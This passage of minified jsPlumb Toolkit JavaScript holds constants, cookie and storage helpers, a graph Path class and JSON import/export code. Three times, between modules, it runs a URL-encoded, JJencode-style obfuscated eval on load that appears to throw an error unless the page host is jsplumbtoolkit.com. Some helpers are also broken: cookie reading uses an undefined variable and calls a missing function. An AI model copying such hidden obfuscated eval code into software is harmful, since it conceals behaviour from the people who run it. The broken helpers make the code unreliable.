        SURFACE_SELECTED_CONNECTION: "jtk-surface-selected-connection",
        SURFACE_PANNING: "jtk-surface-panning",
        SURFACE_ELEMENT_DRAGGING: "jtk-surface-element-dragging",
        SURFACE_DROPPABLE_NODE: "jtk-surface-droppable-node",
        TOOLBAR: "jtk-toolbar",
        TOOLBAR_TOOL: "jtk-tool",
        TOOLBAR_TOOL_SELECTED: "jtk-tool-selected",
        TOOLBAR_TOOL_ICON: "jtk-tool-icon"
    }, this.jsPlumbToolkit.Constants = {
        click: "click",
        start: "start",
        stop: "stop",
        drop: "drop",
        disabled: "disabled",
        pan: "pan",
        select: "select",
        drag: "drag",
        left: "left",
        right: "right",
        top: "top",
        bottom: "bottom",
        width: "width",
        height: "height",
        leftmin: "leftmin",
        leftmax: "leftmax",
        topmin: "topmin",
        topmax: "topmax",
        min: "min",
        max: "max",
        nominalSize: "50px",
        px: "px",
        onepx: "1px",
        nopx: "0px",
        em: "em",
        absolute: "absolute",
        relative: "relative",
        none: "none",
        block: "block",
        hidden: "hidden",
        div: "div",
        id: "id",
        plusEquals: "+=",
        minusEquals: "-=",
        dot: ".",
        transform: "transform",
        transformOrigin: "transform-origin",
        nodeType: "Node",
        portType: "Port",
        edgeType: "Edge",
        groupType: "Group",
        surfaceNodeDragScope: "surfaceNodeDrag",
        mistletoeLayoutType: "Mistletoe",
        surfaceType: "Surface",
        jtkStatePrefix: "jtk-state-",
        msgCannotSaveState: "Cannot save state",
        msgCannotRestoreState: "Cannot restore state"
    }, this.jsPlumbToolkit.Attributes = {
        jtkNodeId: "jtk-node-id",
        relatedNodeId: "related-node-id"
    }, this.jsPlumbToolkit.Methods = {
        addClass: "addClass",
        removeClass: "removeClass"
    }, this.jsPlumbToolkit.Events = {
        beforeDrop: "beforeDrop",
        beforeDetach: "beforeDetach",
        click: "click",
        canvasClick: "canvasClick",
        canvasDblClick: "canvasDblClick",
        connection: "connection",
        connectionAborted: "connectionAborted",
        connectionDetached: "connectionDetached",
        connectionMoved: "connectionMoved",
        connectionDragStop: "connectionDragStop",
        contentDimensions: "contentDimensions",
        contextmenu: "contextmenu",
        dataLoadStart: "dataLoadStart",
        dataAppendStart: "dataAppendStart",
        dataLoadEnd: "dataLoadEnd",
        dataAppendEnd: "dataAppendEnd",
        dblclick: "dblclick",
        drag: "drag",
        drop: "drop",
        dragover: "dragover",
        dragend: "dragend",
        edgeAdded: "edgeAdded",
        edgeRemoved: "edgeRemoved",
        edgeTypeChanged: "edgeTypeChanged",
        elementDragged: "elementDragged",
        elementAdded: "elementAdded",
        elementRemoved: "elementRemoved",
        endOverlayAnimation: "endOverlayAnimation",
        graphClearStart: "graphClearStart",
        graphCleared: "graphCleared",
        groupAdded: "groupAdded",
        groupDragStop: "groupDragStop",
        groupExpand: "group:expand",
        groupCollapse: "group:collapse",
        groupRelayout: "group:relayout",
        groupRemoved: "groupRemoved",
        groupMemberAdded: "group:addMember",
        groupMemberRemoved: "group:removeMember",
        groupMoveEnd: "groupMoveEnd",
        groupUpdated: "groupUpdated",
        lassoEnd: "lasso:end",
        modeChanged: "modeChanged",
        mousedown: "mousedown",
        mousemove: "mousemove",
        mouseout: "mouseout",
        mouseup: "mouseup",
        mouseenter: "mouseenter",
        mouseleave: "mouseleave",
        mouseover: "mouseover",
        nodeAdded: "nodeAdded",
        nodeDropped: "nodeDropped",
        nodeMoveStart: "nodeMoveStart",
        nodeMoveEnd: "nodeMoveEnd",
        nodeRemoved: "nodeRemoved",
        nodeVisibility: "nodeVisibility",
        edgeTarget: "edgeTarget",
        nodeTypeChanged: "nodeTypeChanged",
        edgeSource: "edgeSource",
        objectRepainted: "objectRepainted",
        pan: "pan",
        portAdded: "portAdded",
        portRemoved: "portRemoved",
        portTypeChanged: "portTypeChanged",
        redraw: "redraw",
        start: "start",
        startOverlayAnimation: "startOverlayAnimation",
        stateRestored: "stateRestored",
        stop: "stop",
        tap: "tap",
        touchend: "touchend",
        touchmove: "touchmove",
        touchstart: "touchstart",
        unload: "unload",
        nodeRendered: "nodeRendered",
        nodeUpdated: "nodeUpdated",
        portUpdated: "portUpdated",
        edgeUpdated: "edgeUpdated",
        zoom: "zoom",
        relayout: "relayout",
        deselect: "deselect",
        selectionCleared: "selectionCleared",
        resize: "resize",
        anchorChanged: "anchorChanged"
    }
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this;
    a.jsPlumbToolkit.util = {
        Cookies: {
            get: function (a) {
                document.cookie.match(new RegExp(a + "=[a-zA-Z0-9.()=|%/_]+($|;)", "g"));
                return val && 0 != val.length ? unescape(val[0].substring(a.length + 1, val[0].length).replace(";", "")) || null : null
            }, set: function (a, b, c, d) {
                var e = [a + "=" + escape(b), "/", (domain, window.location.host)], f = function () {
                    if ("NaN" == parseInt(d)) return "";
                    var a = new Date;
                    return a.setTime(a.getTime() + 60 * parseInt(d) * 60 * 1e3), a.toGMTString()
                };
                return d && e.push(f(d)), document.cookie = e.join("; ")
            }, unset: function (b, c, d) {
                c = c && "string" == typeof c ? c : "", d = d && "string" == typeof d ? d : "", a.jsPlumbToolkit.util.Cookies.get(b) && a.jsPlumbToolkit.util.Cookies.set(b, "", "Thu, 01-Jan-70 00:00:01 GMT", c, d)
            }
        }, Storage: {
            set: function (b, c) {
                "undefined" == typeof localStorage ? a.jsPlumbToolkit.util.Cookies.set(b, c) : localStorage.setItem(b, c)
            }, get: function (b) {
                return "undefined" == typeof localStorage ? a.jsPlumbToolkit.util.Cookies.read(b) : localStorage.getItem(b)
            }, clear: function (b) {
                "undefined" == typeof localStorage ? a.jsPlumbToolkit.util.Cookies.unset(b) : localStorage.removeItem(b)
            }, clearAll: function () {
                if ("undefined" == typeof localStorage) ; else for (; localStorage.length > 0;) {
                    var a = localStorage.key(0);
                    localStorage.removeItem(a)
                }
            }, setJSON: function (b, c) {
                if ("undefined" == typeof JSON) throw new TypeError("JSON undefined. Cannot store value.");
                a.jsPlumbToolkit.util.Storage.set(b, JSON.stringify(c))
            }, getJSON: function (b) {
                if ("undefined" == typeof JSON) throw new TypeError("JSON undefined. Cannot retrieve value.");
                return JSON.parse(a.jsPlumbToolkit.util.Storage.get(b))
            }
        }
    }
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this, b = a.jsPlumbToolkit, c = b, d = a.jsPlumbUtil;
    c.Path = function (a, b) {
        this.bind = a.bind, this.getModel = a.getModel, this.setSuspendGraph = a.setSuspendGraph, this.getNodeId = a.getNodeId, this.getEdgeId = a.getEdgeId, this.getPortId = a.getPortId, this.getNodeType = a.getNodeType, this.getEdgeType = a.getEdgeType, this.getPortType = a.getPortType;
        for (var c = a.getGraph().findPath(b.source, b.target, b.strict, b.nodeFilter, b.edgeFilter), e = function () {
            for (var b = 0; b < c.path.length; b++) c.path[b].edge && a.removeEdge(c.path[b].edge);
            return this
        }.bind(this), f = function () {
            for (var b = 0; b < c.path.length; b++) a.removeNode(c.path[b].vertex);
            return this
        }.bind(this), g = function (b, d) {
            var e = a.findGraphObject(b), f = !1;
            if (e) for (var g = 0; g < c.path.length; g++) if (c.path[g].vertex == e || c.path[g].edge == e || !d && "Port" == c.path[g].vertex.objectType && c.path[g].vertex.isChildOf(e)) {
                f = !0;
                break
            }
            return f
        }, h = [], i = {}, j = 0; j < c.path.length; j++) h.push(c.path[j].vertex), i[a.getNodeId(c.path[j].vertex)] = [c.path[j].vertex, j];
        this.getNodes = function () {
            return h
        }, this.getNode = function (a) {
            return i["string" == typeof a ? a : a.id][0]
        }, this.getAllEdgesFor = function (a) {
            var b = i[a.id][1];
            return b < c.path.length - 1 ? [c.path[b + 1].edge] : []
        };
        var k = function (a, b) {
            for (var e = b || 0; e < c.path.length; e++) try {
                a(e, c.path[e])
            } catch (a) {
                d.log("Path iterator function failed", a)
            }
        };
        this.each = function (a) {
            k(function (b, c) {
                a(b, c)
            })
        }, this.eachNode = function (a) {
            k(function (b, c) {
                a(b, c.vertex)
            })
        }, this.eachEdge = function (a) {
            k(function (b, c) {
                a(b, c.edge)
            }, 1)
        }, this.getNodeCount = function () {
            return c.path.length
        }, this.getNodeAt = function (a) {
            return c.path[a].vertex
        }, this.getEdgeCount = function () {
            return 0 == c.path.length ? 0 : c.path.length - 1
        }, this.getEdgeAt = function (a) {
            return a < 0 && (a = c.path.length - 1 + a), c.path.length > a + 1 ? c.path[a + 1].edge : null
        }, this.path = c, this.deleteEdges = e, this.deleteNodes = f, this.deleteAll = f, this.isEmpty = function () {
            return 0 == c.path.length
        }, this.getCost = function () {
            return c.pathDistance
        }, this.contains = g, this.exists = function () {
            return null != c.pathDistance
        }, this.selectEdges = function (a) {
            return _selectEdges(a, "getEdges", !1)
        }, this.selectAllEdges = function (a) {
            return _selectEdges(a, "getAllEdges", !0)
        }
    }
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this, b = a.jsPlumbToolkitIO = {}, c = a.jsPlumbUtil, d = a.jsPlumb, e = function (a, b, c) {
        for (var d = a.nodes || [], e = a.edges || [], f = a.ports || [], g = a.groups || [], h = 0; h < g.length; h++) b.addGroup(g[h]);
        for (var i = 0; i < d.length; i++) b.addNode(d[i]);
        for (var j = 0; j < f.length; j++) if (f[j].nodeId) {
            var k = b.getNode(f[j].nodeId);
            if (null == k) throw new TypeError("Unknown node [" + f[j].nodeId + "]");
            k.addPort(f[j])
        }
        for (var l = 0; l < e.length; l++) {
            var m = {
                source: e[l].source,
                target: e[l].target,
                cost: e[l].cost || 1,
                directed: e[l].directed,
                data: e[l].data
            };
            e[l].geometry && (m.geometry = e[l].geometry), b.addEdge(m)
        }
    }, f = function (a, b) {
        return a.getGraph().serialize()
    }, g = function (a, b, c) {
        var d = function (a) {
            var c = b.addNode(a);
            if (a.children) for (var e = 0; e < a.children.length; e++) {
                var f = b.addNode(a.children[e]);
                b.addEdge({source: c, target: f}), d(a.children[e])
            }
        };
        d(a)
    };
    b.exporters = {json: f}, b.parsers = {
        json: e,
        "hierarchical-json": g
    }, b.managers = {
        json: {
            removeNode: function (a, b, d) {
                var e = d(b.data);
                c.removeWithFunction(a.nodes, function (a) {
                    return a.id === e
                })
            }, removeEdge: function (a, b, d) {
                var e = d(b.data);
                c.removeWithFunction(a.edges, function (a) {
                    return a.data && a.data.id === e
                })
            }, addNode: function (a, b, c) {
                a.nodes = a.nodes || [], a.nodes.push(b.data)
            }, addEdge: function (a, b, c) {
                var d = {source: b.source.getFullId(), target: b.target.getFullId(), data: b.data || {}};
                a.edges = a.edges || [], a.edges.push(d)
            }, addPort: function (a, b, c) {
                a.ports = a.ports || [];
                var e = d.extend({}, b.port.data || {});
                e.id = b.port.getFullId(), a.ports.push(e)
            }, removePort: function (a, b, d) {
                var e = b.port.getFullId();
                c.removeWithFunction(a.ports, function (a) {
                    return a.id === e
                })
            }
        }
    }, b.parse = function (a, c, d, e) {
        var f = b.parsers[a];
        if (null == f) throw new Error("jsPlumb Toolkit - parse - [" + a + "] is an unsupported type");
        return f(c, d, e)
    }, b.exportData = function (a, c, d) {
        var e = b.exporters[a];
        if (null === e) throw new Error("jsPlumb Toolkit - exportData - [" + a + "]  is an unsupported type");
        return e(c, d)
    }, b.manage = function (a, c, d, e, f, g) {
        b.managers[d] && b.managers[d][a] && b.managers[d][a](c, e, f)
    }, "undefined" != typeof exports && (exports.jsPlumbToolkitIO = b)
